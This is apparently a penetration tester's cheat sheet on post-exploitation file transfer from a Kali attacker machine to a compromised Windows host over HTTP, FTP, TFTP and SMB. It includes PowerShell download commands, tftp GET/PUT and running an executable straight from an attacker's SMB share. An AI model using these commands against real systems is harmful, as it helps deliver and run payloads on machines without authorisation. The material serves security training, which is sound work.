### Post Exploitation File transfer

#### File Transfer from kali to windows:
Here we will be transferring the `xxxx.exe` from kali to windows
In Kali, utilities like `curl` and `wget` will be exported by default hence, there will no need of covering file transfer methods for them

- [http](#http)
- [ftp](#ftp)
- [tftp](#tftp)
- [SMB](#smb)

##### HTTP Transferring <a name='http'></a>
*Setting UP the server :*
- Apache
- Python 
<h5>Apache:</h5>

```bash
cp xxxx.exe /var/www/html
service apache2 start

#The apache2 server's activity can be verfied with
─[kali@kali]─[~]$ service apache2 status
● apache2.service - The Apache HTTP Server
     Loaded: loaded (/lib/systemd/system/apache2.service; disabled; vendor preset: disabled)
     Active: active (running) since Sat 2020-08-01 04:28:17 EDT; 12s ago

```

<h5>Python:</h5>

```bash
# python2 uses the module SimpleHTTPServer specified with port
python -m SimpleHTTPServer 8080
# python3 uses the module http.server specified with port
python3 -m http.server 8080
# by deafult both uses port no. 8000 when left unspecified
```

*Receiving the file:*
- When GUI is available, fire up the browser and navigate to `http://iamserver:port/xxxx.exe` to download the file
- When only CLI is available, the webclient object is used

```powershell
powershell -c (new-object System.Net.WebClient).DownloadFile('http://iamserver:port/xxxx.exe','C:\download\path\xxxx.exe')
# If the abouve one fails
powershell.exe -command Invoke-WebRequest -Uri 'http://iamserver:port/xxxx.exe' -OutFile 'C:\download\path\xxxx.exe'
```

##### FTP Transferring <a name='ftp'></a>
- Windows has an inbuilt ftp client located in,`C:\Windows\System32\ftp.exe`

*Setting UP the server:*
- vsftpd
- Python
- Metasploit

<h5>vsftpd :</h5>

- Installing a fully functional `ftp` service in the kali machine

```bash
apt-get install vsftpd
#in the vsftpd.conf
local_enable = yes
write_enable = yes
chroot_list_enable=YES
chroot_list_file=/etc/vsftpd.chroot_list
anonymous_enable=yes
#end of editing config file

vsftpd start 
```

<h5>Python :</h5>

- Python uses the `pytftpd` module

```bash
apt-get install python-pytftpdlib
python -m pytftpd -p 21
```

<h5>Metasploit: </h5>

```bash
msfconsole
use auxilary/server/ftp
set FTPUSER wr3nch
set FTPPASS damnedsec
set FTPROOT directory/path
run
```

*Receiving the file:*
- As `ftp` is pre installed in windows, ftp login to obtain files

```bash
ftp 10.10.10.10
username anonymous
password anonymous
#set the transfer to binary mode
binary
#download file
get xxxx.exe
```

##### TFTP Transferring <a name='tftp'></a>

- `tftp` is installed by default in windows xp machine but is disabled in newer machines
- Through tftp, files can be downloaded in a single command

*Setting UP the server:*
- atftpd
- Metasploit

<h5>atftpd: </h5>
- Linux exports with built in tftp service

```bash
service atftpd start
```

<h5>Metasploit: </h5>

```bash
msfconsole
use auxilary/server/tftp
set TFTPROOT directory/path
run
```

*Receiving the file:*

- Enabling tftp as it is disabled by default in newer machines

```bash
pkgmgr /iu:"TFTP"
```

- tftp doesnt require any authentication
- If installed in the victim machine make use of it

```bash
#download a file
tftp -i 10.10.10.10 GET xxxx.exe

#upload a file
tftp -i 10.10.10.10 PUT xyz.exe
```

##### SMB Transferring <a name='smb'></a>

- SMB is exported builtin with windows

*Setting UP the server:*

- Linux
- Impacket

<h5>Linux: </h5>

```bash
#inastall dependencies
python-glade2 system-config-samba

# Configuring SAMBA
# edit the /etc/samba/smb.conf file
# change the workgroup= WORKGROUP to your network needs and tweak and save the conf file
# restart the samba
sudo service smbd restart
```
<h5>Impacket: </h5>

- The `smbserver.py` in the impackets will take care of every cofigurations and binds to port 445
```bash
python smbserver.py wr3nch directory/path
```
- This can be verified with `SMBCLIENT` which is pre-installed in LINUX
```bash
# connect to the specified IP with no password
# the name wr3nch given when starting the smbserver.py will be shown as the share name
smbclient -L 10.10.10.11 --no-pass
```

*Receiving the file:*

- The smb server is treated as a local share
- Just access it to obtain the files

```bash
# list the contents of the share
dir \\10.10.10.11\wr3nch

# copy files from ther server to the windows machine
copy \\10.10.10.11\wr3nch\xxxx.exe .

# executing files straight from the server 
\\10.10.10.11\wr3nch\xxxx.exe
```
